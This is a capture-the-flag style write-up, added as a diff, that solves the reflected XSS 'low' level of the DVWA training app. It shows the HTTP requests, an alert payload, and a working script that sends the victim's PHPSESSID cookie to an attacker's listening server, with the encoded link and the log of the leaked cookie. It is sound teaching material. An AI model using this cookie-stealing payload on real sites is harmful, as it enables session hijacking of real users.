@@ -1,0 +1,97 @@
+#+TITLE: DVWA - XSS Reflected Low
+#+AUTHOR: Leonardo Tamiano
+
+* Description
+  We see a form that prints what we put in the input box
+
+  [[./img/form.png]]
+  
+  The following GET is perform to update the code displayed by the server
+
+  #+begin_example
+GET /vulnerabilities/xss_r/?name=leonardo HTTP/1.1
+Host: evil
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://evil/vulnerabilities/xss_r/?name=%3Cscript%3E+alert%281%29%3B+%3C%2Fscript%3E
+Accept-Encoding: gzip, deflate, br
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=301dckse7uvq2hn6dbmu9o62t2; security=low
+Connection: close
+  #+end_example
+
+* Solution
+  The idea is to simply inject javascript code with the following payload
+
+  #+begin_example
+<script> alert(1); </script>
+  #+end_example
+
+  and we trigger the javascript code
+
+  [[./img/xss_low.png]]
+
+  The HTTP request is as follows
+
+  #+begin_example
+GET /vulnerabilities/xss_r/?name=%3Cscript%3E+alert%281%29%3B+%3C%2Fscript%3E HTTP/1.1
+Host: evil
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://evil/vulnerabilities/xss_r/?name=leonardo
+Accept-Encoding: gzip, deflate, br
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=301dckse7uvq2hn6dbmu9o62t2; security=low
+Connection: close
+
+  #+end_example
+
+  To actually leak the php cookie to a malcious server we can first
+  start a python web server
+
+  #+begin_src sh
+python3 -m http.server 1337
+  #+end_src
+
+  and then we use the following malicious javascript
+
+  #+begin_src javascript
+var xhr = new XMLHttpRequest();
+xhr.open('GET', `http://localhost:1337/${document.cookie}`, false);
+xhr.send(null);
+  #+end_src
+
+  with we can embedd in the following malicious URL
+
+  #+begin_example
+http://evil/vulnerabilities/xss_r/?name=%3Cscript%3E+var+xhr+%3D+new+XMLHttpRequest%28%29%3B+xhr.open%28%27GET%27%2C+%60http%3A%2F%2Flocalhost%3A1337%2F%24%7Bdocument.cookie%7D%60%2C+false%29%3B+xhr.send%28null%29%3B+%3C%2Fscript%3E
+  #+end_example
+
+  When the user clicks on that link in our python server we see the
+  cookie being leaked
+
+  #+begin_example
+[leo@archlinux xss_reflected]$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+127.0.0.1 - - [07/Nov/2023 18:57:08] code 404, message File not found
+127.0.0.1 - - [07/Nov/2023 18:57:08] "GET /PHPSESSID=301dckse7uvq2hn6dbmu9o62t2;%20security=low HTTP/1.1
+  #+end_example
+
+  
+* Code
+  The code is really simple, it simply does an ~echo~ of the user
+  supplied variable, which means we can put any sort of javascript and
+  the browser will interpret it as legal js
+
+  #+begin_src php
+<?php
+header ("X-XSS-Protection: 0");
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Feedback for end user
+    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
+}
+?>
+  #+end_src
